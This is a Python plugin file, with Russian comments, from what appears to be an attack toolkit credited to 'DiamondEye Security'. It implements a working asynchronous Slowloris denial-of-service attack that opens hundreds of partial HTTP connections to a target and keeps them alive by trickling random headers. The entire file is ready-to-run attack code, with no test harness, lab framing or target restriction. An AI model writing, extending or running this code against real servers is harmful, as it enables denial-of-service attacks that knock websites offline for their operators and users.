# plugins/slowloris_plugin.py
from plugins.plugin_manager import BasePlugin, PluginInfo
from typing import Dict, Any, List
import asyncio
import random
import time
import logging
from colorama import Fore, Style

logger = logging.getLogger(__name__)


class SlowlorisPlugin(BasePlugin):
    """Slowloris атака - множество долгоживущих неполных соединений (асинхронная версия)"""
    
    def __init__(self):
        self.connections: List[asyncio.StreamWriter] = []
        self.running = False
        self.sent_connections = 0
        
    async def initialize(self, config: Dict[str, Any]) -> bool:
        self.config = config
        self.host = config.get('host', '')
        self.port = config.get('port', 80)
        self.max_connections = config.get('max_connections', 500)
        self.timeout = config.get('timeout', 10)
        return True
    
    async def execute(self, target: str, **kwargs) -> Dict[str, Any]:
        """Запуск Slowloris атаки"""
        parsed_target = target.replace('http://', '').replace('https://', '')
        host = parsed_target.split('/')[0]
        port = 80 if 'http:' in target else 443
        
        self.running = True
        self.sent_connections = 0
        
        print(f"{Fore.CYAN}🐌 Starting Slowloris attack on {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  Creating {self.max_connections} partial connections...{Style.RESET_ALL}")
        
        # Создаем задачи для поддержания соединений
        tasks = []
        for i in range(self.max_connections):
            if not self.running:
                break
                
            task = asyncio.create_task(self.maintain_connection(host, port, i))
            tasks.append(task)
            
            # Небольшая задержка между созданиями соединений
            await asyncio.sleep(0.01)
        
        # Ждем завершения или остановки
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        
        return {
            'attack_type': 'slowloris',
            'target': f"{host}:{port}",
            'connections_created': self.sent_connections,
            'duration': kwargs.get('duration', 0),
            'status': 'completed' if self.running else 'stopped'
        }
    
    async def maintain_connection(self, host: str, port: int, conn_id: int):
        """Поддержание одного неполного соединения (асинхронно)"""
        reader = None
        writer = None
        
        try:
            # Устанавливаем асинхронное соединение
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=(port == 443)),
                timeout=self.timeout
            )
            self.sent_connections += 1
            
            # Отправляем неполный HTTP запрос
            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: Mozilla/5.0 (Slowloris)\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            # НЕ отправляем завершающие \r\n - соединение остается открытым
            
            writer.write(request.encode())
            await asyncio.wait_for(writer.drain(), timeout=2.0)
            
            # Периодически отправляем дополнительные заголовки
            while self.running:
                await asyncio.sleep(random.randint(5, 15))
                
                if self.running and writer and not writer.is_closing():
                    # Отправляем еще один заголовок
                    header = f"X-{random.randint(1000, 9999)}: {random.randint(10000, 99999)}\r\n"
                    writer.write(header.encode())
                    try:
                        await asyncio.wait_for(writer.drain(), timeout=2.0)
                    except asyncio.TimeoutError:
                        break
                    
                    # Вывод статистики каждые 10 соединений
                    if conn_id % 10 == 0:
                        print(f"\r{Fore.WHITE}🐌 Active connections: {self.sent_connections}{Style.RESET_ALL}", end="")
        
        except (asyncio.TimeoutError, ConnectionError, OSError, asyncio.IncompleteReadError) as e:
            # Соединение разорвано или не удалось установить
            if self.running and conn_id % 20 == 0:
                print(f"\n{Fore.YELLOW}⚠️  Connection {conn_id} failed: {e}{Style.RESET_ALL}")
                logger.debug(f"Slowloris connection {conn_id} error: {e}")
        finally:
            if writer and not writer.is_closing():
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
                except Exception:
                    pass
    
    async def cleanup(self):
        """Очистка ресурсов"""
        self.running = False
        # Даем время на завершение
        await asyncio.sleep(0.5)
        print(f"\n{Fore.GREEN}✅ Slowloris attack stopped{Style.RESET_ALL}")
    
    def get_info(self) -> PluginInfo:
        return PluginInfo(
            name="Slowloris",
            version="2.2.0",
            author="DiamondEye Security",
            description="Low-bandwidth Slowloris attack that holds connections open (async)",
            attack_types=['http', 'https']
        )